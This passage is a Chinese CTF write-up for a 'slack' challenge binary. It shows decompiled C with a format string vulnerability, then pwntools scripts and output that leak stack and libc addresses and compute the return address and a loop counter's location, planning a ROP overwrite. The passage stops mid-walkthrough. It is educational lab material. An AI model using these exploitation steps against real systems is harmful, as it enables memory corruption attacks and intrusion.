
```c
int __cdecl main(int argc, const char **argv, const char **envp) {
  unsigned int v3; // eax
  int v4; // eax
  int i; // [rsp+8h] [rbp-68h]
  __gid_t rgid; // [rsp+Ch] [rbp-64h]
  time_t timer; // [rsp+10h] [rbp-60h] BYREF
  struct tm *tp; // [rsp+18h] [rbp-58h]
  char s[32]; // [rsp+20h] [rbp-50h] BYREF
  char format[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v13; // [rsp+68h] [rbp-8h]
  v13 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Welcome to slack (not to be confused with the popular chat service Slack)!");
  timer = time(0LL);
  tp = localtime(&timer);
  v3 = time(0LL);
  srand(v3);
  for ( i = 0; i <= 2; ++i ) // 循环3次
  {
    strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);// 生成时间字符串
    v4 = rand();
    printf("%s -- slack Bot:  %s\n", s, (&messages)[v4 % 8]);// 随机打印messages里的句子，里面有8句
    printf("Your message (to increase character limit, pay $99 to upgrade to Professional): ");
    fgets(format, 14, stdin); // 输入数据到format，最多14Byte
    tp = localtime(&timer);
    strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);// 再次生成时间字符串
    printf("%s -- You: ", s);
    printf(format); // 打印前面输入的format。格式化字符串漏洞
    putchar(10); // 打印换行
  }
  return v13 - __readfsqword(0x28u);
}
```

保护全开，这里也只有格式化字符串漏洞，那就只能想办法覆盖`ret`了。

1）覆写`ret`，那首先需要泄漏出栈里存放`ret`的地址

2）然后，覆盖为`rop`链的地址，那还需要泄漏出`libc`基址

所以总体思路：

1）泄漏栈和`libc`的地址

2）覆写`ret`为`rop`链的地址

## 5.3 调试

### 5.3.1 泄露栈地址和libc地址

首先，想要通过格式化字符串漏洞泄露栈上的内容，一般都会在输入时敲很多`%p`，但是注意，这里的每次输入最多`14Byte`。所以为了方便查看结果，以及不用敲那么多次输入，用脚本：

```python
from pwn import *
import warnings
import subprocess

warnings.filterwarnings(action='ignore', category=BytesWarning)

s = lambda data : p.send(data)
sa = lambda delim,data : p.sendafter(delim, data)
sl = lambda data : p.sendline(data)
sla = lambda delim,data : p.sendlineafter(delim, data)
r = lambda num=4096 : p.recv(num)
ru = lambda delims, drop=True : p.recvuntil(delims, drop)
ruf = lambda delims, drop=False : p.recvuntil(delims, drop)
rl = lambda drop=True : p.recvline(drop)
rlf = lambda drop=False : p.recvline(drop)
uu64 = lambda data : u64(data.ljust(8,'\x00'))
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info : log.success(info)
itr = lambda : p.interactive()

context.clear(arch='amd64')
context.log_level = 'CRITICAL'
context.terminal = ['tmux','splitw','-h','-F','#{pane_pid}','-P']

def dbg():
    gdb.attach(p)

elf = ELF("./slack")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

for i in range(0x10):
    p = process("./slack")
    sla(b"): ", f"%{i}$p")
    ru("You: ")
    data = rl().strip()
    print(f"{i=} {data=}")
    p.close()
```

执行两次，结果如下：

```text
root@8edd47208f9e:/chal# python3 exp.py
i=0 data=b'%0$p'
i=1 data=b'0x7fff6f4d5620'    <-- 0x7ff -> 栈地址
i=2 data=b'(nil)'
i=3 data=b'0x7fdc7e7b2a37'    <-- 这个变化有点大
i=4 data=b'0x1c'
i=5 data=b'0x7fffffff'
i=6 data=b'(nil)'
i=7 data=b'(nil)'
i=8 data=b'0x64b18516'
i=9 data=b'0x7f654113a6a0'   <-- 选这个来计算libc地址
...
root@8edd47208f9e:/chal# python3 exp.py
i=0 data=b'%0$p'
i=1 data=b'0x7ffe90dc0320'    <---
i=2 data=b'(nil)'
i=3 data=b'0x7f02f86a3a37'    <---
...
i=9 data=b'0x7f137e5e76a0'    <---
```

接着，用`gdb`确认一下这两个`index`是否是`stack`和`libc`的地址，并计算偏移：

```python
# step1: leak stack/libc
sla(b"): ", "%1$p %9$p")
ru("You: ")
data = rl().strip().decode().split()
some_stack_addr = data[0]
some_libc_addr = data[1]
logsucc("some_stack_addr = " + some_stack_addr)
logsucc("some_libc_addr = " + some_libc_addr)
dbg()
itr()
```

`ret_addr - some_stack_addr = 0x7ffc8fb1e328 - 0x7ffc8fb1c190`

`libc_base_addr - some_libc_addr = 0x7f35e31bf000 - 0x7f35e33df6a0`

![image-20230715021206586](https://bbs.kanxue.com/upload/attach/202402/830671_BFWWXXTQ5VHVT79.jpg)

验证之后，毛有问题。

```python
# step1: leak stack/libc
sla(b"): ", "%1$p %9$p")
ru("You: ")
data = rl().strip().decode().split()
some_stack_addr = data[0]
some_libc_addr = data[1]
logsucc("some_stack_addr = " + some_stack_addr)
logsucc("some_libc_addr = " + some_libc_addr)
main_ret_addr = int(some_stack_addr,16) + (0x7ffc8fb1e328 - 0x7ffc8fb1c190)
libc_base_addr = int(some_libc_addr,16) + (0x7f35e31bf000 - 0x7f35e33df6a0)
libc.address = libc_base_addr
leak("main_ret_addr", main_ret_addr)
leak("libc_base_addr", libc_base_addr)
dbg()
itr()
```

![image-20230715021938323](https://bbs.kanxue.com/upload/attach/202402/830671_347TB42URYDJR5M.jpg)

### 5.3.2 修改变量i的值为一个大负数

还有两次触发机会。接下来需要把一个`rop`链的地址写到`main_ret_addr`里，也就是要把一个大数（8字节）写入到某个地址，那这需要一个字节一个字节写。还是那个问题，输入长度有限，不能一次性写长的`payload`，而现在触发`printf`的机会也只剩两次了。那可以修改局部变量`i`为一个负数来增加循环次数，从而增加触发`printf`的机会。

要覆写`i`为一个负数，首先来看一下`i`的地址：

```c
int i; // [rsp+8h] [rbp-68h]
```

那么泄露`i`的地址：

```python
# step2: set i to some negative number
i_addr = main_ret_addr - (0x68 + 8)
leak("i_addr", i_addr)
```

结果如下：

```text
root@8edd47208f9e:/chal# python3 exp.py
...
[+] i_addr = 0x7fff1d91b458
```

对于整型变量`i`来说，其内容为4个字节，

```
00     00     00     01
addr+3              addr
```

要将其值变成负数，最简单的方法就是把最高的一个字节变成`0xff`。

```
(i_addr+3) + "%kc%j$hhn"
8Byte         最少9Byte
```

很明显，输入空间不足以支撑。需要另想办法，如下图。

![image-20230715171949130](https://bbs.kanxue.com/upload/attach/202402/830671_2ZDMUQ2BPBWUUUV.jpg)

一步一步来，先来看看循环第二次时，`call printf`时栈的情况：
